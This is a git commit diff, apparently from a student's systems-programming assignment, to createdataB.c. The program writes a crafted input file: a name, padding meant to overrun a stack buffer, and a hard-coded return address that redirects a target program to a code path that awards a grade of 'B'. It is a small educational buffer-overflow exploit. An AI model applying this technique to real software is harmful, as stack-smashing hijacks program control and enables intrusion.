82cbe0c5d7441dd1229c52cf8c59d73689a46e12
jonah <jj2556@princeton.edu>
2024-12-05 13:59:33 -0500

    createdataB

--- createdataB.c
+++ createdataB.c
@@ -19,6 +19,9 @@
 */
 int main(void)
 {
+    char* name = "Jonahjeff";
+    int i;
+    unsigned long ulAddr;
     /* open a file that will be written to in write binary mode */
     FILE *f = fopen("dataB", "w");
 
@@ -26,17 +29,15 @@ int main(void)
     if (!f) return 1; 
 
     /* write student name and nullbyte to file */
-    char *name = "Jonahjeff";
-    fwrite(*name, 1, 9, f);
+    fwrite(name, 1, 9, f);
     fputc('\0', f);
 
     /* writes padding to overrun the stack and go past getName*/
-    for (int i = 0; i < 39; i++) {
+    for (i = 0; i < 38; i++) {
         fputc('0', f);
     }
 
     /* writes address of instruction in main to get a B; see memmap */
-    unsigned long ulAddr;
     ulAddr = 0x400890;
     fwrite(&ulAddr, sizeof(unsigned long), 1, f);
 
